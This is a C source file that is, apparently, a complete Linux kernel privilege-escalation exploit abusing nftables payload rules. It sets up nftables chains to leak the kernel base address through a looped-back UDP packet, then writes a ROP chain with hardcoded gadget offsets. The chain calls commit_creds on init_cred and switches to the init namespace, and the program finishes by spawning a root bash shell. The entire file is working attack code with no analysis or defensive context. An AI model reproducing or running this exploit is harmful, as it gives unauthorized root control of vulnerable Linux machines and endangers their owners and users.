#define _GNU_SOURCE
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <stddef.h>
#include "utils.h"

static struct nftnl_rule *isolate_udp_pkt(uint8_t family, const char *table, const char *chain, const char * target_chain, int port)
{
    struct nftnl_rule *r = NULL;


    r = nftnl_rule_alloc();
    if (r == NULL) {
        perror("OOM");
        exit(EXIT_FAILURE);
    }

    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

    // meta load l4proto => reg 1 
    add_meta(r, NFT_META_L4PROTO, NFT_REG_1); 

    // TODO
    int value = 0x11;
    add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &value, sizeof(value));
    add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0, NFT_REG_1, 2, 2);
    uint16_t dport = htons(port);
    add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &dport, sizeof(uint16_t));

    add_verdict(r, NFT_JUMP, target_chain, NFT_REG_VERDICT);
    return r;
}

static struct nftnl_rule *edit_udp_data(uint8_t family, const char *table, const char *chain)
{
    struct nftnl_rule *r = NULL;

    r = nftnl_rule_alloc();
    if (r == NULL) {
        perror("OOM");
        exit(EXIT_FAILURE);
    }

    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
    
    // TODO
    add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0xffffffca, 0, 0x8, 0xff);        //memcpy(header + 0x8, 0ffffffca, 0xff)
    return r;
}

static struct nftnl_rule *rop(uint8_t family, const char *table, const char *chain)
{
    struct nftnl_rule *r = NULL;

    r = nftnl_rule_alloc();
    if (r == NULL) {
        perror("OOM");
        exit(EXIT_FAILURE);
    }

    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
    
    // TODO
    add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0, 0xffffffca, 0x8, 0xff);        //memcpy(header + 0x8, 0ffffffca, 0xff)

    return r;
}

void install_rule_for_leak()
{
    if(create_rule(isolate_udp_pkt(NFPROTO_IPV4, "filter", "input", "leak", 31337)) == 0 ){
        perror("error creating rule");
        exit(EXIT_FAILURE);
    }
    if(create_rule(edit_udp_data(NFPROTO_IPV4, "filter", "leak")) == 0 ){
        perror("error creating rule");
        exit(EXIT_FAILURE);
    }
}

void install_rule_for_rop()
{
    if(create_rule(isolate_udp_pkt(NFPROTO_IPV4, "filter", "input2", "rop", 21227)) == 0 ){
        perror("error creating rule");
        exit(EXIT_FAILURE);
    }
    if(create_rule(rop(NFPROTO_IPV4, "filter", "rop")) == 0 ){
        perror("error creating rule");
        exit(EXIT_FAILURE);
    }    
}

int port_change = 0;

void udp_client(void * data){
    int client_sock;
    char message[0x200];
    socklen_t addr_size;
    struct sockaddr_in server_addr;

	int port = 31337;
	if (port_change == 1)
		port = 21227;

    client_sock = socket(PF_INET, SOCK_DGRAM, 0);
    if (client_sock == -1) {
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    server_addr.sin_port = htons(port);

    addr_size = sizeof(struct sockaddr_in);
    if (sendto(client_sock, data, 0x200, 0, (struct sockaddr*)&server_addr, addr_size) < 0){
        perror("sendto()");
        exit(EXIT_FAILURE);
    }

    close(client_sock);
}

void udp_server(void * data){
    int server_sock;
    char message[0x200];
    socklen_t client_addr_size;
    struct sockaddr_in server_addr, client_addr;

	int port = 31337;
	if (port_change == 1)
		port = 21227;

    server_sock = socket(PF_INET, SOCK_DGRAM, 0);
    if (server_sock == -1){
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(port);

    if (bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1){
        perror("bind()");
        exit(EXIT_FAILURE);
    }
    
    client_addr_size = sizeof(struct sockaddr);
    recvfrom(server_sock, data, 0x200, 0, (struct sockaddr*)&client_addr, &client_addr_size);

    
    close(server_sock);
}

void rop_chain(uint64_t *udpbuf, uint64_t base)
{
    int idx = 0;
//func
#define _commit_creds 0x0e74a0
#define _switch_task_namespaces 0x0e5c80
#define _bpf_get_current_task 0x217de0
#define __do_softirq_382 0x100017e

//variables
#define _init_cred 0x1e8a2a0
#define _init_nsproxy 0x1e8a060

//gadget
#define cli 0x05bcdc
#define pop_rsi 0x11c051
#define mov_rdi_rax 0x625d74
#define pop_rcx 0x06a400
#define pop_rbx_2 0x039d1f
#define sub_bl_ch 0xd0f462
#define pop_rdi 0x0a4f20
#define add_rsp 0x4a489
#define ret 0x0001fc
#define xor_edx 0xcde7f6

//0xffffffff81039d1f: pop rbx; pop r12; pop rbp; ret;
//0xffffffff81d0f462 : sub bl, ch ; ret

//for make chain easy
#define write_16(x) do {            \
    udpbuf[idx++] = base+x;         \
} while (0)                         \

    memset(udpbuf, 0, 512);
    write_16(cli);
    write_16(__do_softirq_382);
    idx += 11;
    write_16(_bpf_get_current_task);
    write_16(xor_edx);
    write_16(mov_rdi_rax);
    write_16(pop_rsi);
    write_16(_init_nsproxy);
    write_16(_switch_task_namespaces);
    write_16(pop_rdi);
    write_16(_init_cred);
    write_16(_commit_creds);
    write_16(ret);
    write_16(ret);
    write_16(add_rsp);

    printf("[+] rop payload clear!\n");
}

int main(int argc, char *argv[])
{

    int tid, status;
    pthread_t p_thread;
    unsigned char udpbuf[512] = {0,};
    unsigned long kernel_base = 0;

    memset(udpbuf, 0x41, 512);
    new_ns();

    system("ip link set lo up");

    printf("[+] Leak kernel base address\n");
    printf("  [-] install udp server\n");

    tid = pthread_create(&p_thread, NULL, udp_server, (void *)udpbuf);
    if (tid < 0){
        perror("thread create error : ");
        exit(0);
    }

    printf("  [-] setup nftables\n");

    if(create_table(NFPROTO_IPV4, "filter", false) == 0){
        perror("error creating table");
        exit(EXIT_FAILURE);
    }

    if(create_chain("filter", "input", NF_INET_LOCAL_IN) == 0){
        perror("error creating chain");
        exit(EXIT_FAILURE);
    }

    if(create_chain("filter", "leak", 0) == 0){
        perror("error creating chain");
        exit(EXIT_FAILURE);
    }

    if(create_chain("filter", "input2", NF_INET_LOCAL_IN) == 0){
        perror("error creating chain");
        exit(EXIT_FAILURE);
    }

    if(create_chain("filter", "rop", 0) == 0){
        perror("error creating chain");
        exit(EXIT_FAILURE);
    }


    install_rule_for_leak();

    printf("  [-] send & recv udp packet\n");

    usleep(1000);
    udp_client(udpbuf);

    pthread_join(p_thread, (void **)&status);

    kernel_base = *(unsigned long*)(udpbuf) - 0xaa509e;
    printf("  [-] kernel base address %p\n", kernel_base);

	port_change = 1;

    tid = pthread_create(&p_thread, NULL, udp_server, (void *)udpbuf);
    if (tid < 0){
        perror("thread create error : ");
        exit(0);
    }

    printf("  [-] making rop rule\n");
    install_rule_for_rop();

    rop_chain(udpbuf, kernel_base);
    
    printf("  [-] send & recv udp packet\n");

    udp_client(udpbuf);

    pthread_join(p_thread, (void **)&status);
    
    printf("[+] spawning shell\n");
    system("/bin/bash");

    return 0;
}
